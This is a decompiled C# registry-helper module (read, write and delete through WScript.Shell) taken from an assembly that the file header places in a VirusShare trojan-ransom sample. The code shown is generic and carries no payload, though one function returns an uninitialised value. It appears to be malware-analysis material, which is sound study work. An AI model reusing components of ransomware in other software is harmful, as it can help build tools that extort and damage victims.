// Decompiled with JetBrains decompiler
// Type: ABC_Bot.mod_registry
// Assembly: ABC-Bot LITE, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C2CB4D60-1596-4A45-B5DE-4321788ED925
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00013-msil\Trojan-Ransom.Win32.PornoAsset.dcuv-d1ed6a70bd98b6cb5a8ec8bbe82d1c3bba1c7350bcb75c8ff99b6551438069fc.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.CompilerServices;

namespace ABC_Bot
{
  [StandardModule]
  internal sealed class mod_registry
  {
    public static string RegRead(string Path)
    {
label_0:
      int num1;
      string str1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell"));
label_2:
        num3 = 3;
        object Instance = objectValue;
        object[] objArray = new object[1]{ (object) Path };
        object[] Arguments = objArray;
        bool[] flagArray = new bool[1]{ true };
        bool[] CopyBack = flagArray;
        object obj = NewLateBinding.LateGet(Instance, (Type) null, nameof (RegRead), Arguments, (string[]) null, (Type[]) null, CopyBack);
        if (flagArray[0])
          Path = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
        str1 = Conversions.ToString(obj);
        goto label_11;
label_6:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_11;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_6;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_11:
      string str2 = str1;
      if (num2 == 0)
        return str2;
      ProjectData.ClearProjectError();
      return str2;
    }

    public static bool RegWrite(string Path, string Value, string Typ = "REG_SZ")
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell"));
label_2:
        num3 = 3;
        object Instance = objectValue;
        object[] objArray = new object[3]
        {
          (object) Path,
          (object) Value,
          (object) Typ
        };
        object[] Arguments = objArray;
        bool[] flagArray = new bool[3]{ true, true, true };
        bool[] CopyBack = flagArray;
        NewLateBinding.LateCall(Instance, (Type) null, nameof (RegWrite), Arguments, (string[]) null, (Type[]) null, CopyBack, true);
        if (flagArray[0])
          Path = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
        if (flagArray[1])
          Value = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[1]), typeof (string));
        if (flagArray[2])
        {
          Typ = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[2]), typeof (string));
          goto label_14;
        }
        else
          goto label_14;
label_9:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_14;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      bool flag;
      int num5 = flag ? 1 : 0;
      if (num2 == 0)
        return num5 != 0;
      ProjectData.ClearProjectError();
      return num5 != 0;
    }

    public static bool RegDelete(string Path)
    {
label_0:
      int num1;
      bool flag;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell"));
label_2:
        num3 = 3;
        object Instance = objectValue;
        object[] objArray = new object[1]{ (object) Path };
        object[] Arguments = objArray;
        bool[] flagArray = new bool[1]{ true };
        bool[] CopyBack = flagArray;
        NewLateBinding.LateCall(Instance, (Type) null, nameof (RegDelete), Arguments, (string[]) null, (Type[]) null, CopyBack, true);
        if (flagArray[0])
          Path = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
label_4:
        num3 = 4;
        flag = true;
        goto label_11;
label_6:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_4;
              case 5:
                goto label_11;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_6;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_11:
      int num5 = flag ? 1 : 0;
      if (num2 == 0)
        return num5 != 0;
      ProjectData.ClearProjectError();
      return num5 != 0;
    }
  }
}
